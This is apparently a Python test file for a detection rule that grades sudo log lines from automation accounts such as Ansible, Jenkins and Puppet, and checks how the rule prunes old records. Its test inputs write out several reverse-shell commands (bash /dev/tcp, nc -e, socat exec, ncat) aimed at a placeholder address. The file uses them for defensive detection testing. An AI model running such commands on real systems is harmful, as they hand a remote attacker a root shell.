"""Fourth review round: payloads inside automation `sh -c` scripts, the pruning horizon across Linux and network
targets, and late records. Synthetic sudo lines follow sudoers(5) EVENT LOGGING; Ansible's become wrapper is
`/bin/sh -c echo BECOME-SUCCESS-<id> ; <python> ~/.ansible/tmp/ansible-tmp-<id>/<module>`. Hosts and accounts are
invented."""
from __future__ import annotations

import pytest

from romulus.detect.privilege_brokers import (
    PrivilegeBrokerSuspiciousSuccess,
    ansible_module_run,
    script_risks,
)
from tests.test_linux_text_breadth_review import run, sudo_line
from tests.test_linux_text_breadth_round3 import ANSIBLE, _success


def judged(actor, command, tty="unknown"):
    _rule, [match] = run(PrivilegeBrokerSuspiciousSuccess,
                         [sudo_line(0, f"{actor} : TTY={tty} ; PWD=/ ; USER=root ; COMMAND={command}", nid="x")])
    return match


# ---------------------------------------------------------------------------------------------- I-2: sh -c payloads
@pytest.mark.parametrize("actor,command,why", [
    ("ansible", "/bin/sh -c bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", "network socket through the shell"),
    ("ansible", "/bin/sh -c echo BECOME-SUCCESS-abc ; /bin/sh -i", "its script starts an interactive 'sh'"),
    ("jenkins", "/bin/sh -c /bin/sh", "its script starts an interactive 'sh'"),
    ("jenkins", "/bin/sh -c nc -e /bin/sh 1.2.3.4 4444", "reverse-shell form"),
    ("gitlab-runner", "/bin/bash -c socat exec:/bin/sh tcp:1.2.3.4:4444", "socat with exec:"),
    ("puppet", "/bin/sh -c ncat -lvnpe /bin/sh 4444", "reverse-shell form"),
])
def test_automation_scripts_carrying_a_shell_are_high(actor, command, why):
    match = judged(actor, command)
    assert match.proposed_lane == "high" and why in match.claim


def test_the_genuine_ansible_module_run_stays_a_lead():
    _rule, [match] = run(PrivilegeBrokerSuspiciousSuccess, [sudo_line(0, ANSIBLE, nid="g")])
    assert match.proposed_lane == "lead"


@pytest.mark.parametrize("command", [
    "/bin/sh -c echo BECOME-SUCCESS-abc ; /usr/bin/python3 /tmp/ansible-tmp-1/AnsiballZ_setup.py",
    "/bin/sh -c /usr/bin/python3 /home/ansible/.ansible/tmp/ansible-tmp-1/AnsiballZ_setup.py",
    "/bin/bash deploy.sh",
])
def test_ansible_without_its_become_wrapper_shape_is_high(command):
    match = judged("ansible", command)
    assert match.proposed_lane == "high" and "not Ansible's become wrapper" in match.claim


def test_script_and_module_helpers():
    assert script_risks(["echo", "ok", ";", "/usr/bin/python3", "/srv/x.py"]) == []
    assert script_risks(["/bin/bash;"])                       # a statement closed by its own separator
    assert ansible_module_run(ANSIBLE.split("COMMAND=")[1].split(), "ansible")
    assert not ansible_module_run(["BECOME-SUCCESS-x", "/home/other/.ansible/tmp/ansible-tmp-1/m.py"], "ansible")


# ---------------------------------------------------------------------------------------------- I-1: horizon
def test_a_network_target_never_holds_the_horizon():
    rule = PrivilegeBrokerSuspiciousSuccess()
    rule.linux_host_targets = ("linux-host",)                   # the sweep's targets: linux-host, zeek, arkime
    try:
        rule.bind_raw({}, "linux-host")
        for start in range(0, 6000, 500):                       # about 17 hours of successes, one per 10 s
            rule.consume([_success(i, i * 10.0, target="linux-host") for i in range(start, start + 500)])
        held = len(rule.successes)
        assert held < 300                                       # pruned while the Linux target is read
        for network in ("zeek", "arkime"):
            rule.bind_raw({}, network)
            assert rule.consume([]) == []
        rule.bind_raw({}, "linux-host")
        rule.consume([_success(9_000, 60_000.0, target="linux-host")])
        assert len(rule.successes) <= held                      # still pruning: the network targets held nothing
    finally:
        rule.close_spill()


def test_a_record_older_than_the_horizon_is_judged_and_noted():
    rule = PrivilegeBrokerSuspiciousSuccess()
    try:
        rule.consume([_success(i, i * 10.0) for i in range(1000)])
        assert rule.prune() >= 0 and rule.horizon() > 0
        late = sudo_line(0, "www-data : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/bin/id", nid="late")
        [match] = rule.consume([late])
        assert match.proposed_lane == "high"                    # judged, never dropped
        assert "late_record" in rule.limits and rule.limits["late_record"].hits == 1
    finally:
        rule.close_spill()


def test_time_buckets_hold_each_key_once():
    rule = PrivilegeBrokerSuspiciousSuccess()
    try:
        rule.consume([_success(i % 3, i * 1.0) for i in range(30)])   # three keys, ten records each, one bucket
        [keys] = [held for _bucket, held in rule.buckets.items()]
        assert isinstance(keys, set) and len(keys) == 3
    finally:
        rule.close_spill()
